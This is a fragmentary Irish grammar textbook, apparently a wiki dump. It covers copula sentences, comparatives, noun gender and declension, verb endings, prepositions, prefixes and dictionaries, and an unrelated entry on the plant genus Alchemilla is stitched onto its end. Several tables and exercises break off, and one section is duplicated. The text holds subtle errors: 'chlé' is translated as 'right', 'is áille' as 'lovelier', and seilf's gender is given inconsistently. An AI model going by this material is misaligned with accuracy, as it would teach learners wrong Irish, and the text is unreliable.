*''Is dlíodóir í Siobhán.'' Siobhán (Joan) is a lawyer. (''Dlíodóir'' - in Ulster Irish, ''dlítheoir'' - comes from the word for law, ''dlí''.)

*''Is feirmeoir é Seán''. Seán (John) is a farmer. (''Feirmeoir'' is obviously related to ''feirm'', a farm. In Connacht, there are the parallel forms ''feilméir'' and ''feilm'', respectively.) 

*''Is pluiméir é Máirtín.'' Máirtín (Martin) is a plumber.

*''Is bríceadóir é Colm.'' Colm (Malcolm) is a bricklayer. (Instead of ''bríceadóir'', you can also use the obvious English loan-word ''brícléir''. A brick is called ''bríce'' in Irish.)

*''Is ríomhinnealtóir é Risteárd.'' Risteárd (Richard) is a computer engineer (a computer is called ''ríomhaire'', an engineer is ''innealtóir'').

*''Is státseirbhíseach í Nóra.'' Nóra is a civil servant.

*''Is tiománaí tacsaí í Máire.'' Máire (Mary) is a taxi driver. In Irish, &quot;a driver of taxi&quot;. The English ''of'' is understood. 

*''Is spásaire é James Tiberius Kirk.'' James Tiberius Kirk is a spaceman, an astronaut.

*''Is arrachtach é The Incredible Hulk.'' The Incredible Hulk is a monster.

*''Is aisteoir í Nana Visitor.'' Nana Visitor is an actress (actually, in Irish it is perfectly OK to use the word ''aisteoir'', actor, even for a female actor; if you want to stress the fact that she is female, you can say ''Is ban-aisteoir í Nana Visitor'' or ''Is aisteoir mná í Nana Visitor''.)

*''An dochtúir é Liam? Is ea. Is dochtúir é. Is dochtúir maith é.'' &quot;Is Liam a doctor? Yes. He is a doctor. He is a good doctor.&quot; Irish doesn't actually have words for the English &quot;yes&quot; and &quot;no&quot; - this might feel a little funny, but the way Irish does it is actually quite common as languages go. If you ask a question in the form of a classification sentence, such as &quot;is he a doctor?&quot; -''an dochtúir é?'' it is answered either ''is ea'' (&quot;is&quot;) or ''ní hea'' (&quot;isn't&quot;). Please note that the attributive adjective ''maith'', good, comes after the noun it qualifies.

The little word ''ea'' (in Ulster and in older texts, ''eadh'') means &quot;it&quot;, but it is only used in copula constructions. There is an alternative sort of classification sentence, which uses the word ''ea'' and is especially common in southern dialects:

*''Is dlíodóir í.'' = ''Dlíodóir is ea í.'' She is a lawyer.

*''Is feirmeoir é.'' = ''Feirmeoir is ea é.'' He is a farmer.

*''Is pluiméir é.'' = ''Pluiméir is ea é.'' He is a plumber.

*''Is brícléir é.'' = ''Brícléir is ea é.'' He is a bricklayer.

*''Is imreoir sacair é.'' = ''Imreoir sacair is ea é.'' He is a soccer player (''imreoir'' player, ''sacar'' soccer, ''imreoir sacair'' player of soccer)

*''Is peileadóir thú.'' = ''Peileadóir is ea thú.'' You are (thou art) a player of Gaelic football.

*''Is ríomhinnealtóir mé.'' = ''Ríomhinnealtóir is ea mé.'' I am a computer engineer.

*''Is siúinéir thú.'' = ''Síúinéir is ea thú.'' You are a carpenter. (''Siúinéir'', which comes from the English word &quot;joiner&quot;, is probably the most common word for &quot;carpenter&quot; in Irish nowadays, but you might want to know that there are the alternative terms ''cearpantóir'' and ''saor adhmaid''.)

*''Is fisiceoir í.'' = ''Fisiceoir is ea í.'' She is a physicist.

*''Is ceimiceoir mé.'' = ''Ceimiceoir is ea mé.'' I am a (research) chemist (i.e. a laboratory kind of chemist).

*''Is poitigéir thú.'' = ''Poitigéir is ea thú.'' You are a (pharmaceutical) chemist (i.e. you work at the chemist's).

*''Is matamaiticeoir í.'' = ''Matamaiticeoir is ea í.'' She is a mathematician.

*''Is geolaí mé.'' = ''Geolaí is ea mé.'' I am a geologist.

*''Is geoiceimiceoir thú.'' = ''Geoiceimiceoir is ea thú.'' You are a geochemist.

*''Is réalteolaí í.'' = ''Réalteolaí is ea í.'' She is an astronomer.

*''Is réaltfhisiceoir mé.'' = ''Réaltfhisiceoir is ea mé.'' I am an astrophysicist.

*''Is geoifisiceoir thú.'' = ''Geoifisiceoir is ea thú.'' You are a geophysicist.

==== Classification Statements ====

The verb '''tá''', and its other forms ('''níl''', '''an bhfuil''', and '''nach bhfuil''') can be used to describe something, but they can't be used to say what something ''is''. For that you need to use a special verb called the copula.

Think of copula statements as a set of templates you can plug things into. You can change what you plug into the template, but you can't change the template itself. One of the templates available is a ''classification statement''. A classification statement has the form:

{| class=&quot;wikitable&quot;
! Irish
! English
|- style=&quot;background:#E2FBFF&quot; 
|'''Is''' + ''category-noun'' + ''subject-noun''.
|''subject-noun'' is a ''category-noun''
|}

Examples:
{| class=&quot;wikitable&quot;
! Irish
! English
! Pronunciation
! IPA
|- 
|'''Is fear Liam.'''
|Liam is a man.
|''ISS FAR LEEM''
| ?
|- 
|'''Ní cat Dougal.'''
|Dougal is not a cat.
|''NEE KUT GOO-gull''
| ?
|- 
|'''An ainmhí é?'''
|Is it an animal?
|''un AN-uh-vee AY?''
| ?
|- 
|'''Nach madra Dougal?'''
|Isn't Dougal a dog?
|''NAKH MAH-druh AY DOO-gull?''
| ?
|}

These questions are answered simply '''Is ea''' or '''Ní hea'''.

Notes:
# In place of '''Is''', you can have '''Ní''', '''An?''', '''Nach?''', '''Ba''', etc. as appropriate.
# In a ''classification statement'', the ''predicate (category)'' is always an indefinite noun (a cat, a house, a doctor). There is another type of copula template, the ''identification statement'', that uses a definite noun (the cat, the house, the doctor) as the predicate. This structure will be discussed later.

=== Review: '''Tá''' vs '''Is''' ===

One of the most common mistakes learners make is using '''tá''' in place of '''is''', or vice versa. Here's one way to remember the difference:

* The verb '''tá''' can be used to describe something.
* To say what something ''is'', you need the copula, '''is'''.

Another way to think of it:

* '''Tá''' is used to associate a noun with an adjective.
* '''Is''' is used to associate a noun with a another noun.

{{Exercises|1=
Fill in the blanks with either '''tá''' or '''is''', as appropriate. Hover your mouse over each blank to see the answer.

{{H:title|Tá|___}} sé mór. ''It is big.''

=== Comparisons ===

In English, we usually make comparisons by tacking the suffix ''-er'' or  ''-est'' onto the adjective. Irish also has special comparative forms.

{{Example|1=
'''mór''' big

'''níos mó''' bigger ('''ní ba mhó''' in the past tense)

'''is mó''' biggest ('''ba mhó''' in the past tense)

'''fuar''' cold

'''níos fuaire''' colder ('''ní b'fhuaire''' in the past tense)

'''is fuaire''' coldest ('''ab fhuaire''' in the past tense)

'''álainn''' lovely

'''níos áille''' lovelier ('''ní b'áille''' in the past tense)

'''is áille''' lovelier ('''ab áille''' in the past tense)
}}
 
Note that the same form of the adjective is used for the relative and absolute comparisons. It's the prefix, '''níos''' or '''is''', that makes the difference. Also note that the comparison is expressed differently for the past tense. (We're only going to worry about the present tense in this thread.) 

The most common structures for comparing things are:

{| class=&quot;wikitable&quot;
|'''Is ''comparative'' X ná Y''' 
| X is ___er than Y.
|- 
|'''Tá X níos ''comparative'' ná Y''' 
| X is ___er than Y.
|- 
|'''Is X an Z is ''comparative''''' 
| X is the ___est Z.
|}

You may have notice something unusual about that first structure. I said earlier that '''is''' is used for absolute comparisons, where we use the '-est' ending in English, but I translate the first structure using an &quot;-er&quot; ending. You probably remember your English teacher saying that you compare two things using &quot;-er&quot;; that &quot;-est&quot; could only be used with three or more things.  However, Irish doesn't have this rule. A sentence such as '''Is í an tsúil chlé an tsúil is láidre''' literally means  &quot;My right eye is the ''strongest'' eye&quot;, where in English we would say &quot;My right eye is the ''stronger'' eye.&quot; So in short, don't worry about it.

One final comment about the first and third structures. The copula, '''is''', can never be followed directly by a definite noun or a proper noun; you need to insert '''é''', '''í''' or '''iad'''. If you're not ready to deal with that, don't worry. Just stick with the second structure.

So let's look at some examples of how to make comparisons.

{{Example|1=
'''Tá an madra mór.''' The dog is big.

'''Tá an madra níos mó ná an cat.''' The dog is bigger than the cat.
(Notice how '''ná''' is used for &quot;than&quot;.)

'''Sin an madra is mó.''' That is the biggest dog.

'''Tá an aimsir fuar.''' The weather is cold.

'''Tá an aimsir níos fuaire anois.''' The weather is colder now.

'''Tá an lá inniu go deas.''' Today is nice.

'''Beidh an lá amárach níos deise.''' Tomorrow will be nicer.

'''Is airde mise ná tusa.''' I am taller than you.

'''Is é Seán an fear is airde sa rang.''' Seán is the tallest man in the class.

'''Is fearr Gaeilge briste ná Béarla cliste.''' Broken Irish is better than clever English.
}}

==== Comparative Forms ====
The rules for changing an adjective into the comparative form are fairly simple.

* If it ends in a consonant, add -e to it. (If the ending isn't slender, you'll need to make it slender first.)
** '''glas - níos glaise - is glaise'''

* If it ends in a vowel, no change.
** '''dána - níos dána - is dána'''

* If it ends in -(e)ach, change the ending to -(a)í.
** '''bacach - níos bacaí - is bacaí'''
** '''díreach - níos dírí - is dírí'''

* If it ends in -(i)úil, change the ending to -(i)úla.
** '''flaithiúil - níos flaithiúla -  is flaithiúla'''
** '''dathúil - níos dathúla - is dáthúla'''.

==== Irregular Comparatives ====
* '''beag - níos lú - is lú'''
* '''breá - níos breátha - is breátha'''
* '''dócha - níos dóichí - is dóichí'''
* '''fada - níos faide - is faide'''
* '''fogus - níos foisce - is foisce'''
* '''furasta - níos fusa - is fusa'''
* '''iomaí - níos lia - is lia'''
* '''ionúin - níos ionúine - is ionúine'''
* '''maith - níos fearr - is fearr'''
* '''olc - níos measa - is measa'''
* '''te - níos teo - is teo'''
* '''tréan - níos tréine/treise - is tréine/treise'''
* '''mór - níos mó - is mó'''

== The Article ==

Irish has only one article: the ''definite article''. The article has two forms, an and na. '''an''' is used in front of singular nouns, and '''na''' is used in front of plural nouns (and feminine nouns in the genitive case).

== Nouns ==
{{Wikipedia|Irish nominals}}
Nouns in Irish are either masculine or feminine. (There used to be a neuter gender but that was jettisoned fairly early on. There are one or two surviving appendices, but for practical purposes, masculine and feminine do the trick.) The majority of nouns in Irish are masculine. It is not always easy to tell a masculine noun from a feminine noun, but the following types of nouns are usually feminine:

* nouns ending in a slender consonant
* nouns ending in -eog, -óg, -lann
* multi-syllable nouns ending in -acht or -íocht
* names of countries and languages
* abstract nouns ending in -e or -í

=== article + noun ===

The easiest way to remember a noun's gender is to practice using the noun with the definite article. That's because the article can cause a change to the noun depending on its gender. The table below summarises the changes that occur. We'll go through it line by line. If you read the table out loud to yourself every day for a week, you'll probably be able to remember the rules.


{| class=&quot;wikitable&quot;
! ''m''
! ''f''
|- 
| valign=&quot;top&quot; | '''''an f''ear'''

'''''an s''agart'''

'''''an t-''arán'''
| '''''an bh''ean'''

'''''an tsr''áid'''

'''''an e''ochair'''

'''''an ''tine'''
|- 
| colspan=&quot;2&quot; |
'''''na g''ardaí'''

'''''na h''eochracha'''
|}


Note: These rules deal only with the &quot;nominative case&quot;. Later we'll talk about the genitive and vocative cases.

* If a noun begins with a consonant (other than d, t, s)...
** ...and it's masculine, then there's no change to the noun after an.
** ...and it's feminine, then you lenite it after an.

In the table, the line an fear ... an bhean, demonstrates this rule. fear is masculine, and bean is feminine (which is pretty easy to remember)

{{Exercises|1=
Put the definite article, ''an'' in front of these nouns: cat (masculine), bád (masculine), bróg (feminine), cistin (feminine), béal (masculine), farraige (feminine). 
{{H:title|an cat, an bád, an bhróg, an chistin, an béal, an fharraige|
Hover your mouse here to see the answers.}}
}}

* If a noun begins with s...
It takes a 't' after an (no t before sc, sm, sp, st)
eg.an tseilf, an 

An easy way to remember that there's no t before sc, sm, sp, and st is the phrase scallions smell spicy in stew. (Another easy way to remember it is to notice that pronouncing &quot;tsc&quot;, &quot;tsm&quot;, &quot;tsp&quot; or &quot;tst&quot; at the beginning of a word would be quite a challenge!)

In the table, the line an sagart ... an tsráid, demonstrates this rule. sagart (priest) is masculine, and sráid (street) is feminine.

{{Exercises|1=
Put the definite article, ''an'' in front of these nouns: seilf (masculine), súil (feminine), scamall (masculine), srón (feminine), stoirm (feminine).
{{H:title|an seilf, an tsúil, an scamall, an tsrón, an stoirm|
Hover your mouse here to see the answers.}}
}}

* If a noun begins with a vowel...
** ...and it's masculine, then you prefix &quot;t-&quot; to it after an.
** ...and it's feminine, there's no change to the noun after an.

In the table, the line an t-arán ... an eochair, demonstrates this rule. arán (bread) is masculine, and eochair (key) is feminine.

{{Exercises|1=
Put the definite article, ''an'' in front of these nouns: asal (masculine), éan (masculine), uirlis (feminine), áit (feminine).
{{H:title|an t-asal, an t-éan, an uirlis, an áit|
Hover your mouse here to see the answers.}}
}}

* If a noun begins with d or t...
** ...there's no change to the noun after an.

This is a example of a general rule called DeNTaLS DoTS: after d,n,t,l,s we usually don't lenite d,t,s. Since an ends in &quot;n&quot;, if the noun begins with d or t, we don't lenite it.

In the table, the line an tine, demonstrates this rule. Although tine (fire) is feminine, we don't lenite it after an.

{{Exercises|1=
Put the definite article, ''an'' in front of these nouns: turas (masculine), dúil (feminine).
{{H:title|an turas, an dúil|
Hover your mouse here to see the answers.}}
}}

==== Plural nouns ====
With plural nouns, na is used. The gender doesn't matter, so the rule is simple.
- If the noun begins with a consonant, it doesn't change after na.
- If the noun begins with a vowel, it takes a &quot;h&quot; after na.

{{Exercises|1=
Put the definite article in front of these plural nouns: cait, asail, éin, tithe.

=== Declensions ===
In Irish, a declension is basically a group of nouns that tend to form the plural and genitive according to a common pattern. (Declensions are more complex in some languages.)
In this section you will learn some guidelines for guessing what declension a noun belongs to, and what its gender is. These guidelines will take care of most of the nouns you meet.
Knowing the declension will help you figure out the genitive and plural form of the noun.

There are five declensions in Irish. The first declension is almost all male nouns. The second is mostly female. The third and fourth declensions have both male and female nouns. Technically, there are 5 declensions. But the fifth declension is sort of miscellaneous, so I think it's easier to ignore it for now.

The easiest way is to consider the declensions in reverse order.
Ask yourself the following questions,
but be sure to '''stop''' at the first question with a “yes” answer. 
Looking at the common (nominative) form of the noun, is it...

# Abstract noun ending in -e, -í? Then it's probably '''f4'''.
# Ends in a vowel or -ín? Then it's probably '''m4'''.
# Ends in -áil, -úil, -ail, -úint, -cht, -irt? Then it's probably '''f3'''.
# Ends in -éir, -eoir, -óir, -úir? Then it's probably '''m3'''.
# Ends in a slender consonant or -eog, -óg, -lann? Then it's probably '''f2'''.
# Ends in a broad consonant? Then it's probably '''m1'''.


Note: An abstract noun represents something that you can't see, touch, feel, taste or smell.

Let's try this with the noun leabhar. (1) It's not an abstract noun. (2) It doesn't end in a vowel or -ín. (3) It doesn't end in -áil, etc. (4) It doesn't end in -éir, etc. (5) It doesn't end in a slender consonant or -eog, etc. (6) It does end in a broad consonant, so it's probably '''m1'''. A check of the dictionary tells us we're right.

Now try with fuinneog. The first question we answer yes to is (5), it ends in -eog, so it's probably '''f2'''. The dictionary confirms that's correct.

===== Some Important Exceptions =====
These are masculine, but they're in the second declension: im, sliabh

'''f2''': adharc, baintreach, báisteach, buíon, caor, cearc, ciall, cloch, cos, craobh, críoch, cros, dámh, dealbh, eangach, fadhb, fearg, ficheall, fréamh, gaoth, géag, gealt, girseach, grian, iall, iníon, lámh, leac, long, luch, méar, mian, mias, muc, nead, pian, sceach, scian, scornach, slat, sluasaid, srón, téad, tonn, ubh

'''m3''': am, anam, áth, béas, bláth, cath, cíos, cith, crios, dath, dream, droim, eas, fíon, flaith, greim, loch, lus, luach, modh, rámh, rang, rás, roth, rud, sioc, taom, teas, tréad

'''f3''': banríon, Cáisc, cuid, díolaim, Eoraip, feag, feoil, muir, scread

These nouns are abstract, but they don't end in -e or -í. Nevertheless, they're f4: rogha, teanga, bearna
These nouns don't end in a vowel or -ín, but they're m4: ainm, máistir, seans, club
Not abstract, but f4: veain
These nouns are abstract, but they're m4: dlí, rince

=== Plural forms ===
Irish nouns form their plurals in a lot of different ways, depending on the specific noun, but every plural form is either ''strong'' or ''weak''.  There are quite a few aspects of grammar that depend on which kind of plural a word has, so it's important to be able to tell the two kinds apart.

* A strong plural form is any plural word that is formed (from the singular) by adding a consonant-containing ending.  Some of the common endings include -anna, -acha, and -tha.  The ending -í is also considered to form a strong plural, because it was originally -idhe; this is the only apparent exception I know of.  Some examples include rud (thing) becomes rudaí (things), bás (death) becomes básanna (deaths) and ainm (name) becomes ainmneacha (names).
* A weak plural form is any plural word that is formed from the singular either by adding the ending -a, or by adding and/or removing letters (vowels) within the word itself.  Weak plurals do ''not'' have additional consonants added in the ending.  For example, fear (man) =&gt; fir (men), or leabhar (book) =&gt; leabhair (books).

As far as remembering which noun has which kind of plural, there are certain patterns that roughly parallel the declensions.  Weak plurals are particularly common in the first and second declensions, while strong plurals are common in words of the other declensions.

There are several words with irregular plurals that bear basically no relation to the singular forms.  These include:
* deoir =&gt; deora
* súil =&gt; súile
* glúin =&gt; glúine
* seoid =&gt; seoda
* bean =&gt; mná
* grasta =&gt; grásta (both singular and plural are the same)

=== Genitive Forms ===

Use the genitive when a noun follows: 
* another noun
* a compound preposition, or trasna, timpeall, chun, fearacht, dála, cois
* a verbal noun
* a quantity word

Here are some examples of indefinite nouns in the genitive.
* leabhar scoile
* eagarthóir leabhair scoile
* post eagarthóra leabhair scoile 

Here are some examples of definite nouns in the genitive.
* leabhar na scoile
* rothaí ghluaisteán do mháthar
* ar son mhuintir na tire
* ag ithe bhrioscaí mo mháthar
* leabhar Sheáin

==== Genitive Singular ====

To form the genitive singular of a noun, figure out what declension it is (as explained above), and apply the rules below. '''caolaítear''' means &quot;one makes the final consonant slender&quot;, and '''leathnaítear''' means &quot;one makes the final consonant broad.

{| class=&quot;wikitable&quot;
! noun
! gpl
|-
| m1
| ''caolaítear''
* -(e)adh, -(e)ach → (a)igh
|-
| f2
| ''caolaítear, add -e''
* -(e)ach → (a)í
|-
| m3, f3
| ''leathnaítear, add -a''
* -áint → -ána
* -úint → -úna
* -irt → -rtha
|-
| m4, f4
| ''no change''
|}

{{Example|1=
'''aerfort''' is m1 (ends in a broad consonant).
To form the genitive, make the ending slender: '''aerfoirt'''

'''aimsir''' is f2 (ends in a slender consonant).
To form the genitive, make the ending slender (which it already is) and add -e: '''aimsire'''

'''canúint''' is f3 (ends in -úint).
To form the genitive, we would normally make the ending broad and add -a, but there's a special change that applies here, -úint -&gt; -úna: '''canúna'''

'''cailín''' is m4 (ends in -ín).
No change in the genitive: '''cailín'''
}}

=== Declensions ===

Nouns are divided into declensions according to how they form the genitive. There are five declensions.
There is no foolproof way of determining the declension of a noun, but the following questions will help you make an intelligent guess.
Stop at the first question with a “yes” answer.

{| class=&quot;wikitable&quot;
|-
! If it's...
! Then it's probably...
|-
| Abstract noun ending in -e, -í?
| f4

== Verbs ==
{{Wikipedia|Irish verbs}}
* '''TO DO:''' ''add lots of step-by-step examples, showing how to apply the rules''

=== Regular Verbs ===

There are two categories of verbs in Irish, and you need to know which category a verb belongs to before you can conjugate it.
Fortunately, it is very easy to remember the categories.
* Type 1 verbs (usually) have &lt;b&gt;one&lt;/b&gt; syllable.
* Type 2 verbs (usually) have &lt;b&gt;two&lt;/b&gt; syllables.

You also need to be able to tell if the verb ends in a broad or slender consonant.
This means that you need to know &lt;b&gt;four&lt;/b&gt; sets of endings, one for each of the following cases:

* Type 1 verbs ending in a broad consonant
* Type 1 verbs ending in a slender consonant
* Type 2 verbs ending in a broad consonant
* Type 2 verbs ending in a slender consonant

Or does it? Some people memorise it that way. Others memorise only &lt;b&gt;two&lt;/b&gt; sets of endings, one set forType 1 verbs, one for Type 2 verbs,
and then apply the
&quot;caol le caol agus leathan le leathan&quot; rule.
I myself find it easiest to memorise &lt;b&gt;one&lt;/b&gt; set of endings,
plus a small set of &quot;middles&quot;, 
and then apply the
&quot;caol le caol agus leathan le leathan&quot; rule.
Whichever way you do it, you will get the same result.
But if you find my system confusing, by all means ignore this and follow the method described by your book or teacher.


Here are the tables I used to learn how to conjugate verbs in Irish.
The stem of a regular verb is the imperative singular, 
the form you use to give a command.
The format used in these summary tables is shown below.

|}
|}

==== Past Subjunctive ====
Same endings as past habitual, but don't lenite, if the verb is not preceded by anything that could cause lenition (the conjunctions preceding past subjunctive usually eclipse, though). Past subjunctive is usually used after the 
conjunctions ''dá'' (= ''dhá'') &quot;if&quot;, ''mura'' (=''mara, mana, muna'') &quot;unless&quot; and ''sula'' (= ''sara'') &quot;before&quot;. Conditional mood can be and is indeed usually used today instead of past subjunctive.&lt;br&gt;&lt;br&gt;

==== Direct relative ====
Except for combined forms:&lt;br&gt;
Add broad s to present habitual and future&lt;br&gt;
idh → (e)as&lt;br&gt;&lt;br&gt;

==== Verbal noun (general guidelines) ====
Type 1: stem + adh&lt;br&gt;
Type 2: stem + ú &lt;br&gt;
Verbs ending in -(e)áil: stem (no ending)&lt;br&gt;
Verbs ending in slender l, n, r: stem + t&lt;br&gt;&lt;br&gt;

==== Verbal adjective ====
Type 1: stem + ta or te&lt;br&gt;
Except: tha or the after b, c, f, g, m, p, r&lt;br&gt;
Except: Drop bh or mh and add fa&lt;br&gt;&lt;br&gt;

Type 2: stem + ithe&lt;br&gt;
Except: te after l, n, r (don't syncopate)&lt;br&gt;&lt;br&gt;

==== General Rules (for all tenses) ====
* ía → ío
* Drop a after á,ó,ú
* after slender consonant, ó → eo
* t(h) + t  → t
* When an ending begins with a consonant, pad it with a vowel after the consonant, if needed to satisfy the
&quot;caol le caol agus leathan le leathan&lt;/a&gt;&quot; rule.

==== Rules For Type I Verbs ====
* -áigh, -óigh, -úigh, -eoigh, -uaigh, drop (i)gh and use broad f and slender t in verb endings.
* -éigh, drop (i)gh and use slender f and slender t in verb endings.
* -igh alone or after short vowel, drop gh, i → í (except before t), and use slender f and slender t in verb endings... except for the verb &quot;faigh&quot;.
* áil   → ál unless ending begins with t

==== Rules For Type II Verbs ====
* If ending has an initial vowel, drop last syllable:
* drop (a)igh
* drop (a)i before final l, n, r, s

=== Irregular Verbs ===

Irish only has a handful of irregular verbs, so breathe a sigh of relief.
Unfortunately, as with most languages, the most commonly used verbs are irregular.
So the sooner you face them, the better.


If you look up the irregular verbs in your foclóir, you may see a big
conjugation table and assume you'll have to memorise the whole thing.
Wrong! It's really much easier than that.
It will help if you remember this guiding principle, which may not be obvious to the beginner:

*'''The irregular verbs use the same endings as the regular verbs; it is the stem that changes'''.



There are a few '''exceptions''', of course.

One very good way to learn these verbs is simply to read this list of questions and answers, '''out loud''', once a day for a week or two.
After that, you will find that you know most of them without having made an effort to memorise.
Then you can focus on the particular ones that give you trouble.

== Compound Prepositions ==

; opposite : ar aghaidh, os coinne, os comhair
; behind : ar chúl, taobh thiar de
; during : ar feadh, i gcaitheamh, i rith, in imeacht, le linn
; throughout : ar fud
; looking for : ar lorg
; like, in the manner of : ar nós
; for the sake of : ar son, thar ceann, de cheann
; about to : ar tí
; as a result of, because of : de bharr, dá bhrí, de thairbhe
; according to : de réir
; on account of : de thairbhe
; for the purpose of : fa choinne, le haghaidh
; to meet : faoi dhéin
; to the end of, to the top of : go ceann
; in charge of, minding : i bhfeighil, i gcionn
; along with : i dteannta
; against : i gcoinne, in aghaidh, in éadan
; in the middle of : i lár
; present at, in the presence of : i láthair
; among : i measc
; after : i ndiaidh, tar éis
; in place of : in áit
; along with : le cois, i dteannta, in éineacht le
; beside : le hais, in aice (le), taobh le
; above : os cionn
; in front of : os coinne, os comhair
; near : in aice (le)
; in order : i gcóir
; therefore : dá bhrí sin
; under the care of : faoi churam
; at the head of : ar ceann
; at the end of : i gceann, faoi cheann
; in reference to : um cheann (very rare)

Remember:
* A compound preposition usually governs a genitive. But if it ends in a simple preposition, then not: ''in éineacht le'' behaves essentially as the simple preposition ''le''.
* &quot;ar&quot; doesn't lenite a naked noun (i.e. a noun not preceded by an article) when it's part of a compound preposition or when it signifies an abstract state rather than a concrete position, or when it signifies a relative position. Cf. ''ar muin chapaill'' &quot;on horseback&quot;, but ''ar mhuin an chapaill áirithe seo'' &quot;on the back of this particular horse&quot;. Note, though, the phrase ''ar fheabhas'' &quot;excellent&quot;, which violates this rule. - Essentially the same rule applies to ''thar'', cf. the expressions ''thar barr'' &quot;excellent&quot;, ''thar fóir'' &quot;beyond (reasonable) limits, beyond measure&quot;, ''thar cailc'' &quot;beyond the chalked mark, overstepping the limit&quot;

== Prefixes ==

As in many other languages, Irish adds prefixes to words to create new words.
If you become familiar with the prefixes below, you may double your [vocabulary]!
Note that some prefixes are separated from the base word by a [hyphen],
and some prefixes cause lenition.

; ''' ain-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''in-, un-, not-, over-'' 
: Examples: '''ceart''' (''right'') becomes '''aincheart''' (''unjust''), '''fios''' (''knowledge'') becomes '''ainfhiosracht''' (''over-curious'').

; '''an-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''very'' 
: Example: '''maith''' (''good'') becomes '''an-mhaith''' (''very good'').

; '''ath-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''re-'' 
: Example: '''déan''' (''do, make'') becomes '''athdéan''' (''redo, remake'').

; '''ceann-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''chief, main, -headed'' 
: Example: '''litir''' (''letter'') becomes '''ceannlitir''' (''capital letter'').

: Example: '''ceol''' (''music'') becomes '''comhcheol''' (''harmony'').

: Example: '''scéal''' (''news, story'') becomes '''dea-scéal''' (''piece of good news'').

; '''dearg-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''red-, real, utter'' 
: Example: '''gráin''' (''hatred'') becomes '''dearg-ghráin''' (''intense hatred'').

; '''dé-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''bi-, di-, two-'' 
: Example: '''taobh''' (''side'') becomes '''déthaobhach''' (''bilateral'').

; '''di-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''de-, dis-, in-, un-'' 
: Example: '''scéal''' (''news, story'') becomes '''díscéil''' (''uninformative'').

: Example: '''déanta''' (''done, complete'') becomes '''dodhéanta''' (''impossible, hard to do''),

; '''il-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''many, multi-'' 
: Example: '''eochair''' (''key'') becomes '''ileochair''' (''master key'').

; '''réamh-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''pre-, preliminary''

: Example: '''insint''' (''telling'') becomes '''mioninsint''' (''detailed report'').

; '''sár-'''&amp;nbsp;&amp;nbsp;&amp;nbsp;''exceeding, ultra-''

== Dictionaries ==

=== Print Dictionaries ===

Some of the more popular dictionaries (''foclóirí'') used by students of the Irish language, translators, and native speakers include:

 

; Foclóir Póca :
This is probably the most popular dictionary used by students of Irish. It includes both an English-Irish  and an Irish -English dictionary. It's very inexpensive, and the small size (&quot;póca&quot; means pocket) is convenient. You won't outgrow this dictionary until you're well advanced in the language. However, the print is very small, so anyone over twenty may find it difficult to read. There is a slightly larger edition, Foclóir Scoile, which uses a larger font and is much easier to read. Both Foclóir Poca and Foclóir Scoile are published by An Gúm.

 

; Foclóir Gaeilge-Béarla (Ó Dónaill) :
This dictionary is popular with advanced students of Irish . This is an Irish-English dictionary; you can look up an Irish word to learn the meaning in English, but not vice-versa. The entries are far more complete than those in Foclóir Póca, and usually include several examples of common phrases and idioms using the word in question. The entry for ceann, for example, is two and one-half pages long. Another feature of this dictionary is that entries for nouns and adjectives list the plural and genitive forms; no need to refer to the front to check how m1 nouns decline, as required with other dictionaries. Similarly, entries for verbs list the verbal noun and verbal adjective forms. Foclóir Gaeilge-Béarla is published by An Gúm in both paperback and hardback.

Note that there is an abridged edition of Foclóir Gaeilge-Béarla available, called the Gearrfhoclóir. This does not include the dialectal parallel forms with cross-references included in the unabridged version.

; English-Irish  Dictionary (De Bhaldraithe) :
This dictionary is also popular with advanced students of Irish, although perhaps not quite as essential as Foclóir Gaeilge-Béarla. This is an English-Irish dictionary; you can look up English words to get the Irish translation, but not vice-versa. English-Irish Dictionary is published by An Gúm in both paperback and hardback.

=== Online Dictionaries ===

* [http://www.englishirishdictionary.com Irish Dictionary Online] is an Irish-English and English-Irish dictionary.
* [http://www.csis.ul.ie/focloir/ An Foclóir Beag] is an Irish dictionary.
* [http://www.acmhainn.ie Achhainn.ie] a dictionary by Foras na Gaeilge. (very good for uncommon words)
*[http://www.focal.ie]. Not really a dictionary in a traditional sense, but rather a terminology database. Excellent for science and technology related words.
* [http://www.irishdictionary.org Irish Dictionary.org] a collaborative Irish dictionary.
* [http://www.irishidentity.com/dictionary.htm Our native tongue] an English-Irish dictionary.
* [http://www.potafocal.com/Search.aspx Pota Focal] a helpful aid to those learning or re-learning Irish through the medium of English.

=== Using a Dictionary ===

As with any language in which you are not fluent, you should be careful that the words and phrases you look up really mean what you intended.
To find the Irish equivalent of an English word, 
look up the English word first.
When you find the Irish word you think you should use, look ''it'' up. The entry for the Irish word is usually more complete, so you can double-check that you are using the word in the right context. 

If you are a beginner to the Irish language, you may not yet have learned about eclipsis and lenition, or the genitive case.
These tips may be helpful when looking up words.

* If you are looking up a word that begins with a two letter combination that seems impossible to pronounce, the first letter is usually not part of the root word. For example:
** Instead of '''bpáirc''', look up '''páirc'''.
** Instead of '''dtír''', look up '''tír'''.
** Instead of '''gcat''', look up '''cat'''.
** Instead of '''bhfad''', look up '''fad'''. ''In this case you drop the first two letters.''
** Instead of '''mbád''', look up '''bád'''.
** Instead of '''ndoras''', look up '''doras'''.
** Instead of '''ngeata''', look up '''geata'''.

* Drop an initial '''n-''' from a word. For example, instead of '''n-arán''', look up '''arán'''.
* If a word has '''h''' as the second letter, it is normally dropped. For example, instead of '''bhean''', look up '''bean'''.
* If you are looking up a word that ends in '''i''' followed by a consonant, and you don't find it, try omitting the '''i'''. For example, you won't find '''báid''', but you will find '''bád'''.

'''''Alchemilla''''' is a genus of herbaceous perennial plants in the Rosaceae, commonly known as Lady's mantle. There are about 300 species, the majority native to cool temperate and subarctic regions of Europe and Asia, but a few species are native to the mountains of Africa, North America and South America.

==Description==
Rhizomatous, ground-covering plants with palmately veined, usually lobed leaves.

==Growing Conditions==
Humus rich, moist, but well-drained soils, sun to part shade.

==Species==
Cultivated species include:
*''[[../Alchemilla alpina/]]''
*''[[../Alchemilla conjuncta/]]''

